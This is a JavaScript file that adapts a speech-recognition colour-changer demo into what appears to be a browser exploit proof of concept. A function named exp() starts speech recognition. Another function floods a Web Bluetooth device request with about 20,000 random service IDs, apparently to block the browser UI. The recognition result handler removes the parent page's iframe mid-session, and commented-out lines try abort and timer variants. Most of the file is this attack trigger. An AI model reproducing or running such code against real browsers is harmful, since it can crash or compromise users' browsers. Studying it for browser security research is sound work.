
var SpeechGrammarList = SpeechGrammarList || webkitSpeechGrammarList
var SpeechRecognitionEvent = SpeechRecognitionEvent || webkitSpeechRecognitionEvent

var colors = [ 'aqua' , 'azure' , 'beige', 'bisque', 'black', 'blue', 'brown', 'chocolate', 'coral', 'crimson', 'cyan', 'fuchsia', 'ghostwhite', 'gold', 'goldenrod', 'gray', 'green', 'indigo', 'ivory', 'khaki', 'lavender', 'lime', 'linen', 'magenta', 'maroon', 'moccasin', 'navy', 'olive', 'orange', 'orchid', 'peru', 'pink', 'plum', 'purple', 'red', 'salmon', 'sienna', 'silver', 'snow', 'tan', 'teal', 'thistle', 'tomato', 'turquoise', 'violet', 'white', 'yellow'];
var grammar = '#JSGF V1.0; grammar colors; public <color> = ' + colors.join(' | ') + ' ;'

var recognition = new  webkitSpeechRecognition();

var speechRecognitionList = new SpeechGrammarList();
speechRecognitionList.addFromString(grammar, 1);
recognition.grammars = speechRecognitionList;
//recognition.continuous = false;
recognition.lang = 'en-US';
recognition.interimResults = false;
recognition.maxAlternatives = 1;

var diagnostic = document.querySelector('.output');
var bg = document.querySelector('html');
var hints = document.querySelector('.hints');

var colorHTML= '';
colors.forEach(function(v, i, a){
  //console.log(v, i);
  colorHTML += '<span style="background-color:' + v + ';"> ' + v + ' </span>';
});
hints.innerHTML = 'Tap/click then say a color to change the background color of the app. Try '+ colorHTML + '.';

var index=0;
var timer;

function getRndInteger(min, max) {
    return Math.floor(Math.random() * (max - min + 1) ) + min;
}

function blockuiwithb()
{
  console.log('blockuiwithb start');
  function guid() {
  function s4() {
    return Math.floor((1 + Math.random()) * 0x10000)
      .toString(16)
      .substring(1);
  }
  return s4() + s4() + '-' + s4() + '-' + s4() + '-' +
    s4() + '-' + s4() + s4() + s4();
}

gs=[];
for(i=0;i<20*1024;i++) {gs.push(guid())}

options = {
  filters: [
    {services: ['heart_rate']},
    {services: [6146, 0x1803]},
    {services: gs},
    {name: 'ExampleName'},
    {namePrefix: 'Prefix'}
  ],
  optionalServices: ['battery_service']
}
navigator.bluetooth.requestDevice(options).then(function(device) {
  console.log('Name: ' + device.name);
  // Do something with the device.
}) 
console.log('navigator.bluetooth.requestDevice');
 exp(); 
}

function exp() {
  
  //for (var i =0; i<0x90000000;i++)
  
  try{recognition.start();}catch(e){recognition.abort(); try{recognition.start();}catch(e){} }
  //for (var i =0; i<1000000;i++){};
  //for (var i =0; i<1000000;i++){};
  //recognition.abort();	
  //eval("recognition.stop(); alert(1);");
  var inn = getRndInteger(5446,5600)
  //timer = setTimeout('try{recognition.abort();}catch(e){}', inn);
  //console.log("dick " + inn);
  //setTimeout('blockuiwithb()',3000);

}
//window.setInterval(exp, 15000);
function init()
{
  var button = document.getElementById('2');
  button.addEventListener('click', function(event) {
  blockuiwithb();});
    
  button = document.getElementById('1');
  button.addEventListener('click', function(event) {
  exp();  });
}
window.setTimeout(init, 3000);

recognition.onresult = function(event) {
  // The SpeechRecognitionEvent results property returns a SpeechRecognitionResultList object
  // The SpeechRecognitionResultList object contains SpeechRecognitionResult objects.
  // It has a getter so it can be accessed like an array
  // The [last] returns the SpeechRecognitionResult at the last position.
  // Each SpeechRecognitionResult object contains SpeechRecognitionAlternative objects that contain individual results.
  // These also have getters so they can be accessed like arrays.
  // The [0] returns the SpeechRecognitionAlternative at position 0.
  // We then return the transcript property of the SpeechRecognitionAlternative object

  var last = event.results.length - 1;
  var color = event.results[last][0].transcript;

  diagnostic.textContent = 'Result received: ' + color + '.';
  bg.style.backgroundColor = color;
  console.log('Confidence: ' + event.results[0][0].confidence);
  top.document.querySelector('iframe').remove();
}



recognition.onend = function() {
  
  //recognition.stop(); 
  // top.document.querySelector('iframe').remove();
  //console.log("dick onend");
  //exp();
  //top.document.querySelector('iframe').remove();
}



recognition.onerror = function(event) {
  diagnostic.textContent = 'Error occurred in recognition: ' + event.error;
  //console.log("dick onerror");
  //try{recognition.abort();}catch(e){} 
  //top.document.querySelector('iframe').remove();
}
